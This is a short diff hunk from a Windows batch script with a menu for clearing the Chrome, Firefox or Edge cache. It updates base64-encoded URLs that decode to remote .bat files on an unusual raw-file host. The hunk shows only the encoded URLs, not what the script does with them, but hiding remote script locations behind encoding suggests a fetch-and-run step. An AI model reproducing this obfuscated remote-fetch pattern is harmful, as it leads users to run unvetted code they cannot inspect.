@@ -10,9 +10,9 @@ echo ===========================================
 set /p choice="Enter 1, 2, or 3: "
 
 if "%choice%"=="1" (
-    set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1jaHJvbWUtY2FjaGUuYmF0
+    set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1jYWNoZS1zY3JpcHQvbWFpbi9jbGVhci1jaHJvbWUtY2FjaGUuYmF0
 ) else if "%choice%"=="2" (
-    set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1maXJlZm94LWNhY2hlLmJhdA==
+    set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1jYWNoZS1zY3JpcHQvbWFpbi9jbGVhci1maXJlZm94LWNhY2hlLmJhdA==
 ) else if "%choice%"=="3" (
     set encodedUrl=aHR0cHM6Ly9yYXcuaW5ncmF3LmNvbS9BaG1lZHNhbWlyLXRpbGRldGVjaC9jbGVhci1jYWNoZS1zY3JpcHQvbWFpbi9jbGVhci1lZGdlLWNhY2hlLmJhdA==
 ) else (
